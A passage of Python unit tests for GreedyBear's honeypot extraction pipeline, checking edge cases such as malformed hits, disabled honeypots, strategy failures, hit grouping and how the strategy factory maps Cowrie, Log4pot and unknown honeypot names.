                            mock_add.return_value = mock_ioc
                            with patch("greedybear.cronjobs.repositories.CowrieSessionRepository"):
                                with patch.object(pipeline.ioc_repo, "get_ioc_by_name", return_value=mock_ioc):
                                    result = pipeline.execute()

        # Should process hits from all three honeypot types
        self.assertGreaterEqual(result, 0)


class TestEdgeCasesE2E(ExtractionPipelineTestCase):
    """Edge case tests for the extraction pipeline."""

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_malformed_hit_missing_required_fields(self, mock_factory, mock_scores):
        """
        Edge case: Hits with missing required fields should be gracefully skipped.
        Note: Pipeline checks for missing keys and empty strings, but doesn't
        handle None values (those would raise AttributeError on .strip()).
        """
        pipeline = self._create_pipeline_with_mocks()

        # Various malformed hits that pipeline can handle
        # (missing keys or empty string values)
        malformed_hits = [
            MockElasticHit({}),  # Completely empty - missing both keys
            MockElasticHit({"src_ip": "1.2.3.4"}),  # Missing type key
            MockElasticHit({"type": "Cowrie"}),  # Missing src_ip key
            MockElasticHit({"src_ip": "", "type": "Cowrie"}),  # Empty src_ip
            MockElasticHit({"src_ip": "1.2.3.4", "type": ""}),  # Empty type
        ]
        pipeline.elastic_repo.search.return_value = malformed_hits
        pipeline.ioc_repo.is_empty.return_value = False

        result = pipeline.execute()

        # Should skip all malformed hits
        self.assertEqual(result, 0)
        mock_factory.return_value.get_strategy.assert_not_called()

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_hit_with_private_ip_sensor_extraction(self, mock_factory, mock_scores):
        """
        Edge case: Verify sensor extraction works even for hits that don't pass validation.
        Sensors should be extracted from t-pot_ip_ext regardless of other fields.
        """
        pipeline = self._create_pipeline_with_mocks()

        # Hit with sensor but missing type
        hits = [
            MockElasticHit(
                {
                    "src_ip": "192.168.1.1",
                    "t-pot_ip_ext": "10.0.0.99",
                    # Missing 'type' field
                }
            ),
        ]
        pipeline.elastic_repo.search.return_value = hits
        pipeline.ioc_repo.is_empty.return_value = False

        pipeline.execute()

        # Sensor should NOT be extracted for invalid hits (missing type)
        # The validation happens before sensor extraction in the pipeline
        pipeline.sensor_repo.add_sensor.assert_not_called()

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_honeypot_skipped_when_not_ready(self, mock_factory, mock_scores):
        """
        Edge case: is_ready_for_extraction returning False should skip honeypot.
        """
        pipeline = self._create_pipeline_with_mocks()

        hits = [
            MockElasticHit(
                {
                    "src_ip": "1.2.3.4",
                    "type": "DisabledHoneypot",
                    "t-pot_ip_ext": "10.0.0.1",
                }
            ),
            MockElasticHit(
                {
                    "src_ip": "5.6.7.8",
                    "type": "EnabledHoneypot",
                    "t-pot_ip_ext": "10.0.0.2",
                }
            ),
        ]
        pipeline.elastic_repo.search.return_value = hits
        pipeline.ioc_repo.is_empty.return_value = False

        # First honeypot disabled, second enabled
        pipeline.ioc_repo.is_ready_for_extraction.side_effect = [False, True]

        mock_strategy = MagicMock()
        mock_strategy.ioc_records = [self._create_mock_ioc("5.6.7.8")]
        mock_factory.return_value.get_strategy.return_value = mock_strategy

        result = pipeline.execute()

        # Should only process the enabled honeypot
        self.assertEqual(result, 1)
        # Factory should only be called once (for EnabledHoneypot)
        mock_factory.return_value.get_strategy.assert_called_once_with("EnabledHoneypot")

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_strategy_returns_empty_ioc_records(self, mock_factory, mock_scores):
        """
        Edge case: Strategy executes successfully but returns no IOC records.
        """
        pipeline = self._create_pipeline_with_mocks()

        hits = [
            MockElasticHit(
                {
                    "src_ip": "1.2.3.4",
                    "type": "Cowrie",
                }
            ),
        ]
        pipeline.elastic_repo.search.return_value = hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        # Strategy returns empty list
        mock_strategy = MagicMock()
        mock_strategy.ioc_records = []
        mock_factory.return_value.get_strategy.return_value = mock_strategy

        result = pipeline.execute()

        self.assertEqual(result, 0)
        # Scoring should NOT be called when no IOCs
        mock_scores.return_value.score_only.assert_not_called()

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_multiple_strategy_exceptions_handled(self, mock_factory, mock_scores):
        """
        Edge case: Multiple strategies fail but pipeline continues.
        """
        pipeline = self._create_pipeline_with_mocks()
        pipeline.log = MagicMock()

        hits = [
            MockElasticHit({"src_ip": "1.1.1.1", "type": "Honeypot1"}),
            MockElasticHit({"src_ip": "2.2.2.2", "type": "Honeypot2"}),
            MockElasticHit({"src_ip": "3.3.3.3", "type": "Honeypot3"}),
        ]
        pipeline.elastic_repo.search.return_value = hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        # All strategies fail
        mock_strategy = MagicMock()
        mock_strategy.extract_from_hits.side_effect = Exception("Test failure")
        mock_factory.return_value.get_strategy.return_value = mock_strategy

        result = pipeline.execute()

        # Should return 0 (all failed)
        self.assertEqual(result, 0)
        # Should log 3 errors
        self.assertEqual(pipeline.log.error.call_count, 3)

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_partial_strategy_success(self, mock_factory, mock_scores):
        """
        Edge case: Some strategies succeed, some fail - pipeline continues.
        """
        pipeline = self._create_pipeline_with_mocks()
        pipeline.log = MagicMock()

        hits = [
            MockElasticHit({"src_ip": "1.1.1.1", "type": "FailingHoneypot"}),
            MockElasticHit({"src_ip": "2.2.2.2", "type": "SuccessHoneypot"}),
        ]
        pipeline.elastic_repo.search.return_value = hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_failing = MagicMock()
        mock_failing.extract_from_hits.side_effect = Exception("Boom")

        mock_success = MagicMock()
        mock_success.ioc_records = [self._create_mock_ioc("2.2.2.2")]

        mock_factory.return_value.get_strategy.side_effect = [mock_failing, mock_success]

        result = pipeline.execute()

        # Should return 1 (one success)
        self.assertEqual(result, 1)
        # Should log 1 error
        self.assertEqual(pipeline.log.error.call_count, 1)
        # Scoring should be called with successful IOCs
        mock_scores.return_value.score_only.assert_called_once()

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_duplicate_honeypot_hits_grouped(self, mock_factory, mock_scores):
        """
        Edge case: Multiple hits from same honeypot type are grouped together.
        """
        pipeline = self._create_pipeline_with_mocks()

        hits = [
            MockElasticHit({"src_ip": "1.1.1.1", "type": "Cowrie"}),
            MockElasticHit({"src_ip": "2.2.2.2", "type": "Cowrie"}),
            MockElasticHit({"src_ip": "3.3.3.3", "type": "Cowrie"}),
        ]
        pipeline.elastic_repo.search.return_value = hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_strategy = MagicMock()
        mock_strategy.ioc_records = [self._create_mock_ioc("1.1.1.1")]
        mock_factory.return_value.get_strategy.return_value = mock_strategy

        pipeline.execute()

        # Strategy should be called only ONCE with all 3 hits grouped
        mock_factory.return_value.get_strategy.assert_called_once_with("Cowrie")
        self.assertEqual(mock_strategy.extract_from_hits.call_count, 1)

        # Verify all 3 hits were passed together
        call_args = mock_strategy.extract_from_hits.call_args[0][0]
        self.assertEqual(len(call_args), 3)

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_hit_with_special_characters_in_fields(self, mock_factory, mock_scores):
        """
        Edge case: Hits with special characters should be handled gracefully.
        """
        pipeline = self._create_pipeline_with_mocks()

        hits = [
            MockElasticHit(
                {
                    "src_ip": "192.168.1.1",
                    "type": "Cowrie\x00Special",  # Null character in type
                }
            ),
        ]
        pipeline.elastic_repo.search.return_value = hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_strategy = MagicMock()
        mock_strategy.ioc_records = []
        mock_factory.return_value.get_strategy.return_value = mock_strategy

        # Should not raise
        result = pipeline.execute()

        # Type with special chars should still be processed
        self.assertGreaterEqual(result, 0)

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    @patch("greedybear.cronjobs.extraction.pipeline.ExtractionStrategyFactory")
    def test_large_batch_of_hits(self, mock_factory, mock_scores):
        """
        Edge case: Large number of hits should be processed correctly.
        """
        pipeline = self._create_pipeline_with_mocks()

        # Create 1000 hits
        hits = [
            MockElasticHit(
                {
                    "src_ip": f"192.168.{i // 256}.{i % 256}",
                    "type": "Cowrie",
                }
            )
            for i in range(1000)
        ]
        pipeline.elastic_repo.search.return_value = hits
        pipeline.ioc_repo.is_empty.return_value = False
        pipeline.ioc_repo.is_ready_for_extraction.return_value = True

        mock_strategy = MagicMock()
        mock_strategy.ioc_records = [self._create_mock_ioc("192.168.0.1")]
        mock_factory.return_value.get_strategy.return_value = mock_strategy

        result = pipeline.execute()

        # Should process all hits
        self.assertEqual(result, 1)
        # All 1000 hits should be passed to strategy
        call_args = mock_strategy.extract_from_hits.call_args[0][0]
        self.assertEqual(len(call_args), 1000)


class TestFactoryIntegration(ExtractionPipelineTestCase):
    """Tests for ExtractionStrategyFactory integration with pipeline."""

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    def test_factory_creates_cowrie_strategy_for_cowrie(self, mock_scores):
        """Factory should return CowrieExtractionStrategy for 'Cowrie' honeypot."""
        from greedybear.cronjobs.extraction.strategies import CowrieExtractionStrategy
        from greedybear.cronjobs.extraction.strategies.factory import ExtractionStrategyFactory

        factory = ExtractionStrategyFactory(MagicMock(), MagicMock())
        strategy = factory.get_strategy("Cowrie")

        self.assertIsInstance(strategy, CowrieExtractionStrategy)

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    def test_factory_creates_log4pot_strategy_for_log4pot(self, mock_scores):
        """Factory should return Log4potExtractionStrategy for 'Log4pot' honeypot."""
        from greedybear.cronjobs.extraction.strategies import Log4potExtractionStrategy
        from greedybear.cronjobs.extraction.strategies.factory import ExtractionStrategyFactory

        factory = ExtractionStrategyFactory(MagicMock(), MagicMock())
        strategy = factory.get_strategy("Log4pot")

        self.assertIsInstance(strategy, Log4potExtractionStrategy)

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    def test_factory_creates_generic_strategy_for_unknown(self, mock_scores):
        """Factory should return GenericExtractionStrategy for unknown honeypots."""
        from greedybear.cronjobs.extraction.strategies import GenericExtractionStrategy
        from greedybear.cronjobs.extraction.strategies.factory import ExtractionStrategyFactory

        factory = ExtractionStrategyFactory(MagicMock(), MagicMock())
        strategy = factory.get_strategy("UnknownHoneypot")

        self.assertIsInstance(strategy, GenericExtractionStrategy)
        self.assertEqual(strategy.honeypot, "UnknownHoneypot")

    @patch("greedybear.cronjobs.extraction.pipeline.UpdateScores")
    def test_factory_case_sensitive_honeypot_names(self, mock_scores):
        """Factory honeypot matching should be case-sensitive."""
        from greedybear.cronjobs.extraction.strategies import GenericExtractionStrategy
        from greedybear.cronjobs.extraction.strategies.factory import ExtractionStrategyFactory

        factory = ExtractionStrategyFactory(MagicMock(), MagicMock())

        # 'cowrie' (lowercase) should get generic strategy, not Cowrie strategy
        strategy = factory.get_strategy("cowrie")
        self.assertIsInstance(strategy, GenericExtractionStrategy)

        # 'COWRIE' (uppercase) should also get generic strategy
        strategy = factory.get_strategy("COWRIE")
        self.assertIsInstance(strategy, GenericExtractionStrategy)
